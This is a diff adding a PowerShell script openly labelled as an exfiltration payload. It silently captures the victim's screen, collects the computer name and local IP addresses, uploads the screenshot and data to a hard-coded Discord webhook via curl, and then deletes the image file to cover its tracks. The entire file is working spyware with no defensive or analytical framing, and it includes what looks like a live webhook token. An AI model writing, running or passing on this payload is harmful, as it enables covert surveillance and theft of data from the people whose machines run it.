@@ -1,0 +1,28 @@
+# PAYLOAD (.ps1) - Screenshot & Network Info Exfil
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# 1. Captura de Ecrã (Screenshot)
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+
+$filePath = "$env:TEMP\sys_capture.png"
+$bmp.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bmp.Dispose()
+
+# 2. Obter Info de Rede (IP Local para LAN Streaming)
+$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress | Out-String
+
+# 3. Exfiltração para Discord
+$msg = "payload=" + [char]64 + "Screenshot capturado no host: " + $env:COMPUTERNAME + " | IPs Locais: " + $ip
+curl.exe -k -s -F $msg $u
+curl.exe -k -s -F ("file=" + [char]64 + $filePath) $u
+
+# Limpeza
+Remove-Item $filePath
+exit
